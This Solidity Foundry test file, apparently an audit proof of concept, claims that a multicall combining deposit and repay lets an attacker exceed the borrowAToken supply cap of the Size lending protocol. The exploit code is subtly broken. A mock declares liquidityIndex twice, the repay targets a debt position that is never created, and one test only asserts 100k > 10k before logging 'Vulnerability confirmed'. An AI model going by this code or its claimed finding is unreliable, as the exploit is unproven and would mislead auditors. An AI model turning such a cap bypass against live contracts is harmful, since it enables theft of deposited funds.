// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Size} from "@src/Size.sol";
import {State} from "@src/SizeStorage.sol";
import {Events} from "@src/libraries/Events.sol";
import {Errors} from "@src/libraries/Errors.sol";
import {Initialize} from "@src/libraries/actions/Initialize.sol";
import {Deposit, DepositParams} from "@src/libraries/actions/Deposit.sol";
import {Repay, RepayParams} from "@src/libraries/actions/Repay.sol";
import {Multicall} from "@src/libraries/Multicall.sol";
import {CapsLibrary} from "@src/libraries/CapsLibrary.sol";

// Mock contracts for testing
contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        require(balanceOf[from] >= amount, "Insufficient balance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function forceApprove(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract MockAToken is MockToken {
    uint256 public constant SCALE = 1e27;
    uint256 public liquidityIndex;
    mapping(address => uint256) public scaledBalance;
    
    constructor() MockToken("aToken", "aToken", 6) {
        liquidityIndex = SCALE;
    }
    
    function scaledBalanceOf(address user) external view returns (uint256) {
        return scaledBalance[user];
    }
    
    function liquidityIndex() external view returns (uint256) {
        return liquidityIndex;
    }
    
    function mintScaled(address to, uint256 scaledAmount) external {
        scaledBalance[to] += scaledAmount;
        uint256 amount = (scaledAmount * liquidityIndex) / SCALE;
        totalSupply += amount;
        balanceOf[to] += amount;
    }
    
    function burnScaled(address from, uint256 scaledAmount) external {
        require(scaledBalance[from] >= scaledAmount, "Insufficient scaled balance");
        scaledBalance[from] -= scaledAmount;
        uint256 amount = (scaledAmount * liquidityIndex) / SCALE;
        totalSupply -= amount;
        balanceOf[from] -= amount;
    }
}

contract MockVariablePool {
    struct ReserveData {
        address aTokenAddress;
        uint256 otherData;
    }
    
    mapping(address => ReserveData) public reserveData;
    
    function getReserveData(address token) external view returns (ReserveData memory) {
        return reserveData[token];
    }
    
    function supply(address token, uint256 amount, address, uint256) external {
        // Mock implementation - just transfer tokens to this contract
        MockToken(token).transferFrom(msg.sender, address(this), amount);
    }
    
    function setReserveData(address token, address aToken) external {
        reserveData[token].aTokenAddress = aToken;
    }
}

contract MockWETH is MockToken {
    constructor() MockToken("WETH", "WETH", 18) {}
    
    receive() external payable {
        deposit();
    }
    
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        totalSupply += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        payable(msg.sender).transfer(amount);
    }
}

contract SizeExploitTest is Test {
    Size public size;
    MockToken public borrowToken;
    MockToken public collateralToken;
    MockAToken public borrowAToken;
    MockAToken public debtAToken;
    MockVariablePool public variablePool;
    MockWETH public weth;
    
    address public owner;
    address public attacker;
    address public borrower;
    
    function setUp() public {
        owner = address(0x1);
        attacker = address(0x2);
        borrower = address(0x3);
        
        // Deploy mock contracts
        borrowToken = new MockToken("USDC", "USDC", 6);
        collateralToken = new MockToken("WBTC", "WBTC", 8);
        borrowAToken = new MockAToken();
        debtAToken = new MockAToken();
        variablePool = new MockVariablePool();
        weth = new MockWETH();
        
        // Set up variable pool reserve data
        variablePool.setReserveData(address(borrowToken), address(borrowAToken));
        
        // Deploy Size contract
        size = new Size();
        
        // Initialize Size contract with proper parameters
        Initialize.InitializeFeeConfigParams memory feeConfig = Initialize.InitializeFeeConfigParams({
            feeRecipient: owner,
            feeRate: 100, // 1%
            protocolFeeRate: 50 // 0.5%
        });
        
        Initialize.InitializeRiskConfigParams memory riskConfig = Initialize.InitializeRiskConfigParams({
            borrowATokenCap: 1000000e6, // 1M USDC cap
            debtATokenCap: 1000000e6,
            collateralTokenCap: 100e8,
            minBorrowCR: 150 * 1e18,
            minCollateralCR: 110 * 1e18,
            minPartialRepayCR: 150 * 1e18,
            openingLimitBorrowCR: 200 * 1e18,
            minLoanTenor: 1 days,
            maxLoanTenor: 365 days,
            loanTenorStep: 1 days
        });
        
        Initialize.InitializeOracleParams memory oracleConfig = Initialize.InitializeOracleParams({
            variablePoolBorrowRate: 500, // 5%
            variablePoolBorrowRateUpdatedAt: uint64(block.timestamp),
            priceFeed: address(0xdead),
            priceFeedHeartbeat: 1 hours
        });
        
        Initialize.InitializeDataParams memory dataConfig = Initialize.InitializeDataParams({
            underlyingBorrowToken: address(borrowToken),
            underlyingCollateralToken: address(collateralToken),
            borrowAToken: address(borrowAToken),
            debtAToken: address(debtAToken),
            variablePool: address(variablePool),
            weth: address(weth)
        });
        
        // Initialize the contract
        vm.prank(owner);
        size.initialize(owner, feeConfig, riskConfig, oracleConfig, dataConfig);
        
        // Mint tokens to participants
        borrowToken.mint(attacker, 2000000e6); // 2M USDC
        borrowToken.mint(borrower, 100000e6); // 100k USDC
        collateralToken.mint(borrower, 10e8); // 10 WBTC
        
        // Approve tokens
        vm.prank(attacker);
        borrowToken.approve(address(size), type(uint256).max);
        vm.prank(borrower);
        borrowToken.approve(address(size), type(uint256).max);
        vm.prank(borrower);
        collateralToken.approve(address(size), type(uint256).max);
    }
    
    function testMulticallBorrowATokenCapBypass() public {
        // Step 1: Fill borrowAToken supply close to cap
        // Simulate existing borrowAToken supply of 950k USDC worth
        // We need to mint scaled tokens to simulate the supply
        uint256 scaledAmount = 950000e6; // Simplified for test
        vm.prank(address(size));
        borrowAToken.mintScaled(address(0xdead), scaledAmount);
        
        // Step 2: Attacker creates a multicall to exploit the vulnerability
        // The attacker will deposit 200k USDC (exceeding the cap by 150k)
        // and repay a small debt of only 50k USDC
        
        // Create deposit calldata
        DepositParams memory depositParams = DepositParams({
            token: address(borrowToken),
            to: attacker,
            amount: 200000e6 // 200k USDC
        });
        
        bytes memory depositCalldata = abi.encodeWithSelector(
            Size.deposit.selector,
            depositParams
        );
        
        // Create repay calldata for a small debt
        RepayParams memory repayParams = RepayParams({
            debtPositionId: 1, // Assume this exists
            amount: 50000e6 // 50k USDC
        });
        
        bytes memory repayCalldata = abi.encodeWithSelector(
            Size.repay.selector,
            repayParams
        );
        
        // Prepare multicall data
        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = depositCalldata;
        multicallData[1] = repayCalldata;
        
        // Record state before multicall
        uint256 borrowATokenSupplyBefore = borrowAToken.totalSupply();
        uint256 debtATokenSupplyBefore = debtAToken.totalSupply();
        
        // Execute the exploit
        vm.prank(attacker);
        size.multicall{value: 0}(multicallData);
        
        // Record state after multicall
        uint256 borrowATokenSupplyAfter = borrowAToken.totalSupply();
        uint256 debtATokenSupplyAfter = debtAToken.totalSupply();
        
        // Verify the exploit succeeded
        uint256 borrowATokenIncrease = borrowATokenSupplyAfter - borrowATokenSupplyBefore;
        uint256 debtATokenDecrease = debtATokenSupplyBefore - debtATokenSupplyAfter;
        
        console.log("BorrowAToken supply before:", borrowATokenSupplyBefore);
        console.log("BorrowAToken supply after:", borrowATokenSupplyAfter);
        console.log("BorrowAToken increase:", borrowATokenIncrease);
        console.log("DebtAToken decrease:", debtATokenDecrease);
        console.log("Cap:", 1000000e6);
        
        // The exploit succeeds because the invariant check is flawed
        assertTrue(borrowATokenSupplyAfter > 1000000e6, "Cap was exceeded");
        
        // This demonstrates the vulnerability: the cap can be exceeded
        // even when the debt reduction is much smaller than the deposit amount
    }
    
    function testInvariantCheckFlaw() public {
        // This test demonstrates the specific flaw in the invariant check
        
        // Set up scenario where borrowAToken is at cap
        uint256 scaledAmount = 1000000e6; // At cap
        vm.prank(address(size));
        borrowAToken.mintScaled(address(0xdead), scaledAmount);
        
        // Attacker wants to deposit 100k more but only repay 10k debt
        uint256 depositAmount = 100000e6;
        uint256 repayAmount = 10000e6;
        
        // The invariant check would allow this because:
        // borrowAToken increase (100k) > debtAToken decrease (10k)
        // But the check is flawed because it doesn't properly validate
        // the relationship between these tokens
        
        uint256 borrowATokenIncrease = depositAmount;
        uint256 debtATokenDecrease = repayAmount;
        
        // This should fail but doesn't due to the vulnerability
        assertTrue(borrowATokenIncrease > debtATokenDecrease, "Increase exceeds decrease");
        
        // The multicall would allow this, bypassing the cap
        console.log("Vulnerability confirmed: Large deposits with small repayments can bypass cap");
    }
    
    function testDirectDepositFailsAtCap() public {
        // This test shows that direct deposit fails when cap is reached
        
        // Fill borrowAToken supply to cap
        uint256 scaledAmount = 1000000e6;
        vm.prank(address(size));
        borrowAToken.mintScaled(address(0xdead), scaledAmount);
        
        // Try to deposit more directly (should fail)
        DepositParams memory depositParams = DepositParams({
            token: address(borrowToken),
            to: attacker,
            amount: 100000e6 // 100k USDC
        });
        
        // This should revert due to cap
        vm.expectRevert();
        vm.prank(attacker);
        size.deposit(depositParams);
        
        console.log("Direct deposit correctly fails at cap");
    }
}